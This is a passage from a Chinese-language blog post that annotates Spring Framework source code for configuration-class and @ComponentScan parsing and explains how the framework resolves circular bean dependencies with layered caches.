class="comment">//判断当前扫描出来的bean定义是不是一个配置类,若是的话 直接进行递归解析</span></span><br><span class="line">                <span class="keyword">if</span> (ConfigurationClassUtils.checkConfigurationClassCandidate(bdCand, <span class="built_in">this</span>.metadataReaderFactory)) &#123;</span><br><span class="line">                    <span class="comment">//递归解析 因为@Component算是lite配置类</span></span><br><span class="line">                    parse(bdCand.getBeanClassName(), holder.getBeanName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理 @Import annotations</span></span><br><span class="line">    processImports(configClass, sourceClass, getImports(sourceClass), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理 @ImportResource annotations</span></span><br><span class="line">    <span class="type">AnnotationAttributes</span> <span class="variable">importResource</span> <span class="operator">=</span></span><br><span class="line">        AnnotationConfigUtils.attributesFor(sourceClass.getMetadata(), ImportResource.class);</span><br><span class="line">    <span class="keyword">if</span> (importResource != <span class="literal">null</span>) &#123;</span><br><span class="line">        String[] resources = importResource.getStringArray(<span class="string">&quot;locations&quot;</span>);</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">BeanDefinitionReader</span>&gt; readerClass = importResource.getClass(<span class="string">&quot;reader&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String resource : resources) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">resolvedResource</span> <span class="operator">=</span> <span class="built_in">this</span>.environment.resolveRequiredPlaceholders(resource);</span><br><span class="line">            configClass.addImportedResource(resolvedResource, readerClass);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理 @Bean methods 获取到我们配置类中所有标注了@Bean的方法</span></span><br><span class="line">    Set&lt;MethodMetadata&gt; beanMethods = retrieveBeanMethodMetadata(sourceClass);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (MethodMetadata methodMetadata : beanMethods) &#123;</span><br><span class="line">        configClass.addBeanMethod(<span class="keyword">new</span> <span class="title class_">BeanMethod</span>(methodMetadata, configClass));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理配置类接口 默认方法的@Bean</span></span><br><span class="line">    processInterfaces(configClass, sourceClass);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理配置类的父类的 ，循环再解析</span></span><br><span class="line">    <span class="keyword">if</span> (sourceClass.getMetadata().hasSuperClass()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">superclass</span> <span class="operator">=</span> sourceClass.getMetadata().getSuperClassName();</span><br><span class="line">        <span class="keyword">if</span> (superclass != <span class="literal">null</span> &amp;&amp; !superclass.startsWith(<span class="string">&quot;java&quot;</span>) &amp;&amp;</span><br><span class="line">            !<span class="built_in">this</span>.knownSuperclasses.containsKey(superclass)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.knownSuperclasses.put(superclass, configClass);</span><br><span class="line">            <span class="comment">// Superclass found, return its annotation metadata and recurse</span></span><br><span class="line">            <span class="keyword">return</span> sourceClass.getSuperClass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有父类解析完成</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>绕了半天，终于看到我们熟悉的注解了！注解对应配置类的解析顺序如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/15/BmD2IMnZ3SHlJUj.jpg"
                      alt="Screenshot_80.jpg"
                ></p>
<h4 id="ComponentScan的解析"><a href="#ComponentScan的解析" class="headerlink" title="@ComponentScan的解析"></a>@ComponentScan的解析</h4><p>我们从刚刚来看，是如何进来的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> SourceClass <span class="title function_">doProcessConfigurationClass</span><span class="params">(ConfigurationClass configClass, SourceClass sourceClass)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    .......</span><br><span class="line">        <span class="comment">//解析我们的 @ComponentScan 注解</span></span><br><span class="line">        <span class="comment">//从我们的配置类上解析处ComponentScans的对象集合属性</span></span><br><span class="line">        Set&lt;AnnotationAttributes&gt; componentScans = AnnotationConfigUtils.attributesForRepeatable(</span><br><span class="line">        sourceClass.getMetadata(), ComponentScans.class, ComponentScan.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!componentScans.isEmpty() &amp;&amp;</span><br><span class="line">        !<span class="built_in">this</span>.conditionEvaluator.shouldSkip(sourceClass.getMetadata(), ConfigurationPhase.REGISTER_BEAN)) &#123;</span><br><span class="line">        <span class="comment">//循环解析 我们解析出来的AnnotationAttributes</span></span><br><span class="line">        <span class="keyword">for</span> (AnnotationAttributes componentScan : componentScans) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//把我们扫描出来的类变为bean定义的集合 真正的解析</span></span><br><span class="line">            Set&lt;BeanDefinitionHolder&gt; scannedBeanDefinitions =</span><br><span class="line">                <span class="built_in">this</span>.componentScanParser.parse(componentScan, sourceClass.getMetadata().getClassName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//循环处理我们包扫描出来的bean定义</span></span><br><span class="line">            <span class="keyword">for</span> (BeanDefinitionHolder holder : scannedBeanDefinitions) &#123;</span><br><span class="line">                <span class="type">BeanDefinition</span> <span class="variable">bdCand</span> <span class="operator">=</span> holder.getBeanDefinition().getOriginatingBeanDefinition();</span><br><span class="line">                <span class="keyword">if</span> (bdCand == <span class="literal">null</span>) &#123;</span><br><span class="line">                    bdCand = holder.getBeanDefinition();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//判断当前扫描出来的bean定义是不是一个配置类,若是的话 直接进行递归解析</span></span><br><span class="line">                <span class="keyword">if</span> (ConfigurationClassUtils.checkConfigurationClassCandidate(bdCand, <span class="built_in">this</span>.metadataReaderFactory)) &#123;</span><br><span class="line">                    <span class="comment">//递归解析 因为@Component算是lite配置类</span></span><br><span class="line">                    parse(bdCand.getBeanClassName(), holder.getBeanName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .....</span><br><span class="line">        <span class="comment">// 没有父类解析完成</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很显然看到它是按如下的步骤进入的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//把我们扫描出来的类变为bean定义的集合 真正的解析</span></span><br><span class="line">Set&lt;BeanDefinitionHolder&gt; scannedBeanDefinitions =</span><br><span class="line">			<span class="built_in">this</span>.componentScanParser.parse(componentScan,                              									sourceClass.getMetadata().getClassName());</span><br></pre></td></tr></table></figure>

<p>那么我们现在进入这个方法详细说说</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set&lt;BeanDefinitionHolder&gt; <span class="title function_">parse</span><span class="params">(AnnotationAttributes componentScan, <span class="keyword">final</span> String declaringClass)</span> &#123;</span><br><span class="line">		<span class="comment">// 创建一个扫描器scanner</span></span><br><span class="line">       	<span class="comment">// 还记得在创建AnnotationConfigApplicationContext的时候创建的那个扫描器吗 </span></span><br><span class="line">      	<span class="comment">// 当时说了那个扫描器只是供程序员外部调用，这里就证明了</span></span><br><span class="line">   	    <span class="comment">// 在Spring内部，实际上执行扫描的只会是这里创建的scanner对象</span></span><br><span class="line">	<span class="type">ClassPathBeanDefinitionScanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathBeanDefinitionScanner</span>(<span class="built_in">this</span>.registry,</span><br><span class="line">			componentScan.getBoolean(<span class="string">&quot;useDefaultFilters&quot;</span>), <span class="built_in">this</span>.environment, <span class="built_in">this</span>.resourceLoader);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 判断是否重写了默认的命名规则</span></span><br><span class="line">	Class&lt;? <span class="keyword">extends</span> <span class="title class_">BeanNameGenerator</span>&gt; generatorClass = componentScan.getClass(<span class="string">&quot;nameGenerator&quot;</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="type">boolean</span> <span class="variable">useInheritedGenerator</span> <span class="operator">=</span> (BeanNameGenerator.class == generatorClass);</span><br><span class="line">	scanner.setBeanNameGenerator(useInheritedGenerator ? <span class="built_in">this</span>.beanNameGenerator :</span><br><span class="line">			BeanUtils.instantiateClass(generatorClass));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 解析scopedProxy属性，该属性可以将Bean创建为JDK代理/CGLib代理</span></span><br><span class="line">	<span class="type">ScopedProxyMode</span> <span class="variable">scopedProxyMode</span> <span class="operator">=</span> componentScan.getEnum(<span class="string">&quot;scopedProxy&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (scopedProxyMode != ScopedProxyMode.DEFAULT) &#123;</span><br><span class="line">		scanner.setScopedProxyMode(scopedProxyMode);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		Class&lt;? <span class="keyword">extends</span> <span class="title class_">ScopeMetadataResolver</span>&gt; resolverClass = componentScan.getClass(<span class="string">&quot;scopeResolver&quot;</span>);</span><br><span class="line">		scanner.setScopeMetadataResolver(BeanUtils.instantiateClass(resolverClass));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	scanner.setResourcePattern(componentScan.getString(<span class="string">&quot;resourcePattern&quot;</span>));</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">       <span class="comment">// 解析includeFilters属性</span></span><br><span class="line">	<span class="keyword">for</span> (AnnotationAttributes filter : componentScan.getAnnotationArray(<span class="string">&quot;includeFilters&quot;</span>)) &#123;</span><br><span class="line">		<span class="keyword">for</span> (TypeFilter typeFilter : typeFiltersFor(filter)) &#123;</span><br><span class="line">               <span class="comment">// 当调用addIncludeFilter/addExcludeFilter时仅仅把定义的规则保存下来</span></span><br><span class="line">               <span class="comment">// 并没有真正去执行匹配过程</span></span><br><span class="line">			scanner.addIncludeFilter(typeFilter);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">       <span class="comment">// 解析excludeFilters属性</span></span><br><span class="line">	<span class="keyword">for</span> (AnnotationAttributes filter : componentScan.getAnnotationArray(<span class="string">&quot;excludeFilters&quot;</span>)) &#123;</span><br><span class="line">		<span class="keyword">for</span> (TypeFilter typeFilter : typeFiltersFor(filter)) &#123;</span><br><span class="line">			scanner.addExcludeFilter(typeFilter);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 是否懒加载</span></span><br><span class="line">	<span class="type">boolean</span> <span class="variable">lazyInit</span> <span class="operator">=</span> componentScan.getBoolean(<span class="string">&quot;lazyInit&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (lazyInit) &#123;</span><br><span class="line">		scanner.getBeanDefinitionDefaults().setLazyInit(<span class="literal">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 拿到包路径basePackages</span></span><br><span class="line">	Set&lt;String&gt; basePackages = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;();</span><br><span class="line">	String[] basePackagesArray = componentScan.getStringArray(<span class="string">&quot;basePackages&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (String pkg : basePackagesArray) &#123;</span><br><span class="line">		String[] tokenized = StringUtils.tokenizeToStringArray(<span class="built_in">this</span>.environment.resolvePlaceholders(pkg),</span><br><span class="line">				ConfigurableApplicationContext.CONFIG_LOCATION_DELIMITERS);</span><br><span class="line">		Collections.addAll(basePackages, tokenized);</span><br><span class="line">	&#125;</span><br><span class="line">       <span class="comment">/** 从下面的代码可以看出ComponentScans指定扫描目标，除了最常用的basePackages</span></span><br><span class="line"><span class="comment">         * 还有两种方式:</span></span><br><span class="line"><span class="comment">         * 1. 指定basePackageClasses，就是指定多个类，只要是与这几个类同级，</span></span><br><span class="line"><span class="comment">         *    或者在这几个类下级的都可以被扫描到，这种方式其实是spring比较推荐的，</span></span><br><span class="line"><span class="comment">         *    因为指定basePackages没有IDE的检查，容易出错，但是指定一个类</span></span><br><span class="line"><span class="comment">         *    就有IDE的检查了，不容易出错，经常会用一个空的类来作为basePackageClasses</span></span><br><span class="line"><span class="comment">         * 2. 直接不指定，默认会把与配置类同级，或者在配置类下级的作为扫描目标</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">	<span class="keyword">for</span> (Class&lt;?&gt; clazz : componentScan.getClassArray(<span class="string">&quot;basePackageClasses&quot;</span>)) &#123;</span><br><span class="line">		basePackages.add(ClassUtils.getPackageName(clazz));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (basePackages.isEmpty()) &#123;</span><br><span class="line">		basePackages.add(ClassUtils.getPackageName(declaringClass));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 把规则填充到排除规则，这里就把注册类自身当作排除规则，真正执行匹配的时候会把自身给排除</span></span><br><span class="line">	scanner.addExcludeFilter(</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">AbstractTypeHierarchyTraversingFilter</span>(<span class="literal">false</span>, <span class="literal">false</span>) &#123;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">matchClassName</span><span class="params">(String className)</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> declaringClass.equals(className);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">       <span class="comment">// 先把basePackages转为字符串数组的形式</span></span><br><span class="line">	<span class="comment">// 通过扫描器scanner的doScan扫描</span></span><br><span class="line">	<span class="keyword">return</span> scanner.doScan(StringUtils.toStringArray(basePackages));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到它的流程是</p>
<p>1、创建一个扫描器scanner</p>
<p>2、解析了一些属性，代理【特别includeFilters属性</p>
<p>3、然后通过扫描器scanner的doScan扫描</p>
<p>好的，我们接着进入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Set&lt;BeanDefinitionHolder&gt; <span class="title function_">doScan</span><span class="params">(String... basePackages)</span> &#123;</span><br><span class="line">   Assert.notEmpty(basePackages, <span class="string">&quot;At least one base package must be specified&quot;</span>);</span><br><span class="line">   <span class="comment">//最后也是返回一个Bean定义集合</span></span><br><span class="line">   <span class="comment">// 保存解析后的Bean定义集合</span></span><br><span class="line">   Set&lt;BeanDefinitionHolder&gt; beanDefinitions = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 循环需要扫描的包路径</span></span><br><span class="line">   <span class="keyword">for</span> (String basePackage : basePackages) &#123;</span><br><span class="line">      <span class="comment">// findCandidateComponents方法根据包名找到符合条件的BeanDefinition集合</span></span><br><span class="line">      Set&lt;BeanDefinition&gt; candidates = findCandidateComponents(basePackage);</span><br><span class="line">       </span><br><span class="line">      <span class="keyword">for</span> (BeanDefinition candidate : candidates) &#123;</span><br><span class="line">         <span class="comment">// 解析@Scope注解</span></span><br><span class="line">         <span class="type">ScopeMetadata</span> <span class="variable">scopeMetadata</span> <span class="operator">=</span> <span class="built_in">this</span>.scopeMetadataResolver.resolveScopeMetadata(candidate);</span><br><span class="line">          </span><br><span class="line">         candidate.setScope(scopeMetadata.getScopeName());</span><br><span class="line">         <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> <span class="built_in">this</span>.beanNameGenerator.generateBeanName(candidate, <span class="built_in">this</span>.registry);</span><br><span class="line">         <span class="comment">// 下面的两个if都会进入</span></span><br><span class="line">         <span class="keyword">if</span> (candidate <span class="keyword">instanceof</span> AbstractBeanDefinition) &#123;</span><br><span class="line">            <span class="comment">// 内部会设置默认属性</span></span><br><span class="line">            postProcessBeanDefinition((AbstractBeanDefinition) candidate, beanName);</span><br><span class="line">         &#125;</span><br><span class="line">          <span class="comment">// 如果是AnnotatedBeanDefinition，还会再设置一次值</span></span><br><span class="line">         <span class="keyword">if</span> (candidate <span class="keyword">instanceof</span> AnnotatedBeanDefinition) &#123;</span><br><span class="line">            <span class="comment">// 解析@Lazy注解</span></span><br><span class="line">            AnnotationConfigUtils.processCommonDefinitionAnnotations(</span><br><span class="line">                (AnnotatedBeanDefinition) candidate);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//把我们解析出来的组件bean定义注册到我们的IOC容器中（容器中没有才注册）</span></span><br><span class="line">         <span class="keyword">if</span> (checkCandidate(beanName, candidate)) &#123;</span><br><span class="line">            <span class="type">BeanDefinitionHolder</span> <span class="variable">definitionHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionHolder</span>(candidate, beanName);</span><br><span class="line">            definitionHolder =</span><br><span class="line">                  AnnotationConfigUtils.applyScopedProxyMode(scopeMetadata, definitionHolder, <span class="built_in">this</span>.registry);</span><br><span class="line">             </span><br><span class="line">            beanDefinitions.add(definitionHolder);</span><br><span class="line">            <span class="comment">// 最终来到这，完成bean定义的注册</span></span><br><span class="line">            registerBeanDefinition(definitionHolder, <span class="built_in">this</span>.registry);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> beanDefinitions;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到它的解析过程，new一个<code>Set&lt;BeanDefinitionHolder&gt;</code>，然后扫描包路径</p>
<p>对扫描后的Bean定义进行一些配置，最后添加到<code>beanDefinitions</code>，最后<code>registerBeanDefinition</code>完成注册。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set&lt;BeanDefinition&gt; <span class="title function_">findCandidateComponents</span><span class="params">(String basePackage)</span> &#123;</span><br><span class="line">    <span class="comment">// spring支持component索引技术，需要引入一个组件，因为大部分情况不会引入这个组件</span></span><br><span class="line">    <span class="comment">// 所以不会进入到这个if</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.componentsIndex != <span class="literal">null</span> &amp;&amp; indexSupportsIncludeFilters()) &#123;</span><br><span class="line">        <span class="keyword">return</span> addCandidateComponentsFromIndex(<span class="built_in">this</span>.componentsIndex, basePackage);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//调用scanCandidateComponents</span></span><br><span class="line">        <span class="keyword">return</span> scanCandidateComponents(basePackage);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Set&lt;BeanDefinition&gt; <span class="title function_">scanCandidateComponents</span><span class="params">(String basePackage)</span> &#123;</span><br><span class="line">	Set&lt;BeanDefinition&gt; candidates = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;();</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 把传进来的basePackage字符串转换成文件路径的形式</span></span><br><span class="line">           <span class="comment">// com.xx -&gt; classpath*:com/xx/**/*.class</span></span><br><span class="line">		<span class="type">String</span> <span class="variable">packageSearchPath</span> <span class="operator">=</span> ResourcePatternResolver.CLASSPATH_ALL_URL_PREFIX +</span><br><span class="line">				resolveBasePackage(basePackage) + <span class="string">&#x27;/&#x27;</span> + <span class="built_in">this</span>.resourcePattern;</span><br><span class="line">        </span><br><span class="line">           <span class="comment">// 根据路径，获得符合要求的文件</span></span><br><span class="line">		Resource[] resources = getResourcePatternResolver().getResources(packageSearchPath);</span><br><span class="line">		<span class="type">boolean</span> <span class="variable">traceEnabled</span> <span class="operator">=</span> logger.isTraceEnabled();</span><br><span class="line">		<span class="type">boolean</span> <span class="variable">debugEnabled</span> <span class="operator">=</span> logger.isDebugEnabled();</span><br><span class="line">		<span class="keyword">for</span> (Resource resource : resources) &#123;</span><br><span class="line">			<span class="keyword">if</span> (traceEnabled) &#123;</span><br><span class="line">				logger.trace(<span class="string">&quot;Scanning &quot;</span> + resource);</span><br><span class="line">			&#125;</span><br><span class="line">               <span class="comment">// 判断资源是否可读，并且不是一个目录</span></span><br><span class="line">			<span class="keyword">if</span> (resource.isReadable()) &#123;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">                       <span class="comment">//metadataReader元数据读取器，用来解析resource</span></span><br><span class="line">					<span class="type">MetadataReader</span> <span class="variable">metadataReader</span> <span class="operator">=</span> getMetadataReaderFactory().getMetadataReader(resource);</span><br><span class="line">					<span class="keyword">if</span> (isCandidateComponent(metadataReader)) &#123;</span><br><span class="line">						<span class="type">ScannedGenericBeanDefinition</span> <span class="variable">sbd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScannedGenericBeanDefinition</span>(metadataReader);</span><br><span class="line">						sbd.setSource(resource);</span><br><span class="line">                           <span class="comment">// 在isCandidateComponent方法内部会真正执行匹配规则</span></span><br><span class="line">                           <span class="comment">// 这里就会扫描到@Component对应的类</span></span><br><span class="line">                           <span class="comment">// 考虑排除、包含并且对接口、抽象类进行处理</span></span><br><span class="line">						<span class="comment">// 比如Mybatis要重写这个类，因为Mybatis接口也要扫描（@Mapper）</span></span><br><span class="line">						<span class="keyword">if</span> (isCandidateComponent(sbd)) &#123;</span><br><span class="line">							<span class="keyword">if</span> (debugEnabled) &#123;</span><br><span class="line">								logger.debug(<span class="string">&quot;Identified candidate component class: &quot;</span> + resource);</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="comment">// 最后加入集合</span></span><br><span class="line">							candidates.add(sbd);</span><br><span class="line">						&#125;</span><br><span class="line">			</span><br><span class="line">                  ....</span><br><span class="line">                      </span><br><span class="line">       <span class="comment">// 返回结果</span></span><br><span class="line">	<span class="keyword">return</span> candidates;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后我们来总结一下@ComponentScan的解析过程：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/01/3LUXrAGetvE9Rod.jpg"
                      alt="Screenshot_91.jpg"
                ></p>
<h1 id="循环依赖解决"><a href="#循环依赖解决" class="headerlink" title="循环依赖解决"></a>循环依赖解决</h1><h2 id="什么是循环依赖"><a href="#什么是循环依赖" class="headerlink" title="什么是循环依赖"></a>什么是循环依赖</h2><p>什么是循环依赖？请看下面代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanA</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BeanB beanB;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanB</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BeanA beanA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是循环依赖，A依赖B并且B依赖A。我们之前介绍了Spring中Bean的生命周期和创建流程，包括<strong>实例化、属性赋值和初始化</strong>三个阶段，最终Bean会被存入一级缓存中(单例池)。如果按照下面的流程会怎么样：</p>
<p><a href="https://imgtu.com/i/25JhH1"><img  
                     lazyload
                     alt="image"
                     data-src="https://z3.ax1x.com/2021/06/12/25JhH1.jpg"
                      alt="25JhH1.jpg"
                ></a></p>
<p>很明显死循环了，这样是行不通的。Spring当然不会这么傻，Spring引入了<strong>三级缓存</strong>来解决循环依赖的问题，下面我们逐步介绍。</p>
<h2 id="三个缓存"><a href="#三个缓存" class="headerlink" title="三个缓存"></a>三个缓存</h2><h3 id="一级缓存"><a href="#一级缓存" class="headerlink" title="一级缓存"></a>一级缓存</h3><p>假设只有一级缓存，上面我们说了如果在初始化之后才将Bean放入一级缓存，那肯定会出现死循环，我们进行如下改进：</p>
<p><a href="https://imgtu.com/i/25Y9C8"><img  
                     lazyload
                     alt="image"
                     data-src="https://z3.ax1x.com/2021/06/12/25Y9C8.jpg"
                      alt="25Y9C8.jpg"
                ></a></p>
<p>在实例化之后，直接把Bean加入一级缓存，每次获取Bean时先去一级缓存拿，如果拿到了就直接返回。这样可以吗？我们来走一遍流程：</p>
<ol>
<li>开始创建A，实例化完成后将A放入一级缓存</li>
<li>A开始属性赋值，发现依赖B，开始创建B</li>
<li>B实例化完成后，将B放入一级缓存</li>
<li>B开始属性赋值，发现依赖A，开始创建A</li>
<li>因为第2步，B可以从一级缓存拿到A，B完成属性赋值，接着完成初始化</li>
<li>B创建完成，回到A，A完成属性赋值，接着完成初始化</li>
</ol>
<blockquote>
<p>这里注意一下，实例化后就放入一级缓存，这时的Bean属于<strong>早期对象</strong>，因为还没有完成赋值等操作。但是由于创建过程中一直持有该Bean的引用，所以初始化完成后，一级缓存中的Bean会变为<strong>成熟对象</strong>。</p>
</blockquote>
<p>好像没问题了，解决了死循环，并且A、B都初始化成功！但是，这样设计无法保证<strong>多线程情况下的安全问题：</strong></p>
<ul>
<li>可能存在多个线程同时创建Bean，此时一个线程正在创建Bean时，如果另一个线程访问了一级缓存就会拿到不完整的Bean。</li>
<li>其实就是当我们一级缓存中有Bean_liduoan，然而我们某个线程发现有这个Bean，想使用Bean_liduoan.XXX()方法时，发现这个Bean是早期对象，很多东西都没有完成。</li>
</ul>
<p>那如何解决？可以通过加锁解决 (这里必须是<strong>可重入锁</strong>，不然会死锁)，但是由于只有一级缓存，无论怎么锁，一个线程创建Bean的时候就别的线程就没法从缓存中拿Bean，这样性能会大打折扣。我们看看Spring是如何解决的：</p>
<h3 id="二级缓存"><a href="#二级缓存" class="headerlink" title="二级缓存"></a>二级缓存</h3><p>Spring引入了二级缓存，来解决多线程下性能和并发安全的问题：</p>
<p><a href="https://images.gitee.com/uploads/images/2020/1219/103319_1079b047_8183653.jpeg"><img  
                     lazyload
                     alt="image"
                     data-src="https://images.gitee.com/uploads/images/2020/1219/103319_1079b047_8183653.jpeg"
                      alt="输入图片说明"
                ></a></p>
<p>引入二级缓存后，<strong>一级缓存专门用来存放成熟的Bean，二级缓存专门用来存放早期的Bean</strong>。流程如下：</p>
<ol>
<li>首次<code>getBean(A)</code>时先从一级缓存中拿，第一次不能从二级缓存中拿，因为可能会拿到不成熟的Bean。如果没拿到下一步开始创建A。</li>
<li>实例化A完成后，将早期的A加入二级缓存，开始属性赋值，发现A依赖B。</li>
<li>通过<code>getBean(B)</code>开始递归创建B，先从一级缓存中拿，没有再从二级缓存中拿，没拿到下一步开始创建B。</li>
<li>实例化B完成后，将早期的B加入二级缓存，开始属性赋值，发现B依赖A。</li>
<li>又通过<code>getBean(A)</code>开始递归创建A，先从一级缓存中拿，没有再从二级缓存中拿，这里由于第2步，可以从二级缓存中拿到A。</li>
<li>B拿到A后完成属性赋值，接着完成实例化，B创建完成，加入一级缓存。</li>
<li>B创建完成后A完成属性赋值，接着完成实例化，A创建完成，加入一级缓存。</li>
</ol>
<blockquote>
<p>这里有一个问题：第1步、第3步和第5步怎么区别<code>getBean()</code>是只能从一级缓存中拿，还是可以到所有缓存中拿？</p>
<ol>
<li>加锁：当Bean正在创建的时候会通过<code>synchronized</code>加一把锁，访问二级、三级缓存的时候也会通过<code>synchronized</code>加同一把锁。这样当某个线程正在创建Bean的时候，其它线程是不能访问二、三级缓存的，只能访问一级缓存。</li>
<li>做标记：Spring中引入了一个存放<strong>正在创建的Bean</strong>的集合用于限制对二、三级缓存的访问，Bean开始创建时会加入这个集合。从缓存中获取Bean的时候，如果该Bean正在创建，也就是出现在了这个集合中 (说明出现循环依赖)，那么可以从所有缓存中拿，否则只能在一级缓存中拿。</li>
</ol>
<p>这样两点保证了不会出现在非创建阶段从二、三级缓存中获取到不完整Bean的情况。</p>
</blockquote>
<p>引入二级缓存后，锁加在Bean的创建过程，这样加锁<strong>不会影响别的线程从一级缓存中拿成熟的Bean</strong>。这样又解决了多线程下性能和并发安全的问题，完美！那真的一点问题都没有了吗？</p>
<p>如果<strong>存在AOP，需要对Bean进行动态代理</strong>，怎么办？首先考虑一下如果按照我们上面的设计方案，动态代理需要在哪里进行：</p>
<ul>
<li>在Bean初始化完成后代理行吗？<br>不行。因为如果A、B循环依赖，A在初始化完后才动态代理，由于动态代理会生成一个新的对象，那么B注入的将会是没有代理的A。</li>
<li>在Bean实例化之后、加入二级缓存前代理行吗？<br>这样加入二级缓存的就是代理对象，解决了上面一个问题。<strong>最后还需要注意，完成Bean初始化后，将二级缓存中代理过的对象移入一级缓存即可，防止一级缓存中存放的是未代理对象。</strong></li>
</ul>
<p>所以说，在Bean<strong>实例化之后、加入二级缓存前</strong>，如果需要动态代理就进行代理，然后将代理的对象存入二级缓存，这样其实是没问题的。如下图所示：</p>
<p><a href="https://images.gitee.com/uploads/images/2020/1219/130048_afd90207_8183653.jpeg"><img  
                     lazyload
                     alt="image"
                     data-src="https://images.gitee.com/uploads/images/2020/1219/130048_afd90207_8183653.jpeg"
                      alt="输入图片说明"
                ></a>那为什么要加入三级缓存，三级缓存又是干什么的？</p>
